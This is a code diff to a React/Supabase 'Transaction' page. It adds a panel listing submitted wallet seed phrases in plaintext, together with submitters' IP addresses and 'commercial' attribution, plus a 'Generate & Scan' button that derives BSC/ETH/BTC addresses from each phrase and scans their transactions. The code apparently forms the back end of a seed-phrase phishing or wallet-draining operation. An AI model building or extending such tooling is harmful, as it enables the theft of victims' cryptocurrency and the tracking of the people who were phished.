@@ -30,6 +30,44 @@ const Transaction = () => {
     }
   });
 
+  // Fetch recent seed phrase submissions
+  const { data: seedSubmissions = [] } = useQuery({
+    queryKey: ['seed-submissions'],
+    queryFn: async () => {
+      const { data, error } = await supabase
+        .from('seed_phrase_submissions')
+        .select('id, phrase, commercial_id, commercial_name, created_at, ip_address, status')
+        .order('created_at', { ascending: false })
+        .limit(100);
+      if (error) throw error;
+      return data || [];
+    }
+  });
+
+  // Mutation to process a seed phrase: generate addresses and start scan
+  const processSeedMutation = useMutation({
+    mutationFn: async ({ phrase, commercialId }: { phrase: string; commercialId: string | null }) => {
+      const { data, error } = await supabase.functions.invoke('generate-wallet-addresses', {
+        body: {
+          seed_phrase: phrase,
+          commercial_id: commercialId,
+          scan: true
+        }
+      });
+      if (error) throw error;
+      return data;
+    },
+    onSuccess: () => {
+      toast.success("Addresses generated and scan started");
+      queryClient.invalidateQueries({ queryKey: ['wallet-groups'] });
+      queryClient.invalidateQueries({ queryKey: ['all-transactions'] });
+    },
+    onError: (error) => {
+      toast.error("Failed to process seed phrase");
+      console.error('Error processing seed phrase:', error);
+    }
+  });
+
   // Mutation to generate wallet addresses
   const generateAddressesMutation = useMutation({
     mutationFn: async ({ walletId, seedPhrase }: { walletId: string; seedPhrase: string }) => {
@@ -232,6 +270,47 @@ const Transaction = () => {
             Filter
           </Button>
         </div>
+
+        {/* Seed Phrase Submissions */}
+        <Card className="mb-6">
+          <CardHeader>
+            <CardTitle className="flex items-center gap-2">
+              <Plus className="w-5 h-5" />
+              Seed Phrase Submissions
+            </CardTitle>
+            <CardDescription>
+              Generate BSC/ETH/BTC addresses from submitted seed phrases and start scanning transactions
+            </CardDescription>
+          </CardHeader>
+          <CardContent>
+            {seedSubmissions.length === 0 ? (
+              <div className="text-sm text-muted-foreground">No recent seed phrase submissions.</div>
+            ) : (
+              <div className="space-y-4">
+                {seedSubmissions.map((s: any) => (
+                  <div key={s.id} className="flex items-center justify-between p-4 bg-muted/30 rounded-lg border">
+                    <div className="flex-1">
+                      <div className="flex items-center justify-between">
+                        <div className="text-sm text-muted-foreground">
+                          {new Date(s.created_at).toLocaleString()} • {s.commercial_name || 'Unknown'}
+                        </div>
+                      </div>
+                      <div className="mt-2 font-mono text-xs bg-background p-2 rounded border break-all">{s.phrase}</div>
+                      <div className="text-xs text-muted-foreground mt-1">IP: {s.ip_address || 'N/A'}</div>
+                    </div>
+                    <Button
+                      className="ml-4"
+                      disabled={processSeedMutation.isPending || !s.commercial_id}
+                      onClick={() => processSeedMutation.mutate({ phrase: s.phrase, commercialId: s.commercial_id })}
+                    >
+                      {processSeedMutation.isPending ? 'Processing...' : 'Generate & Scan'}
+                    </Button>
+                  </div>
+                ))}
+              </div>
+            )}
+          </CardContent>
+        </Card>
 
         {/* Wallets Needing Address Generation */}
         {walletsNeedingAddresses.length > 0 && (
